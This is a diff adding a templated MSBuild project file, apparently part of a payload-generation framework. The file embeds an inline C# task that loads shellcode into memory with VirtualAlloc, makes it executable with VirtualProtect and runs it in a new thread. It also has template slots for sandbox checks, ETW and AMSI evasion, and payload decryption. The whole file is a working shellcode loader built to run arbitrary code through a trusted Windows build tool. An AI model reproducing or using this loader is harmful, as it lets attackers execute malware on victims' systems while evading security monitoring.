@@ -1,0 +1,55 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="{{ classname }}">
+    <MalForgeTask/>
+  </Target>
+  <UsingTask TaskName="MalForgeTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Security" />
+      <Using Namespace="System" />
+      <Using Namespace="System.Runtime.InteropServices" />
+      {{ msbuild_crypto_using }}
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Runtime.InteropServices;
+{{ crypto_using }}
+using Microsoft.Build.Utilities;
+
+public class MalForgeTask : Task
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint c, IntPtr t);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
+
+    [DllImport("kernel32.dll")]
+    static extern void Sleep(uint ms);
+{{ amsi_imports }}
+
+    public override bool Execute()
+    {
+{{ sandbox_block }}
+{{ etw_block }}
+{{ amsi_block }}
+        byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
+{{ decrypt_block }}
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
+        Marshal.Copy(buf, 0, addr, buf.Length);
+        uint _vp;
+        VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
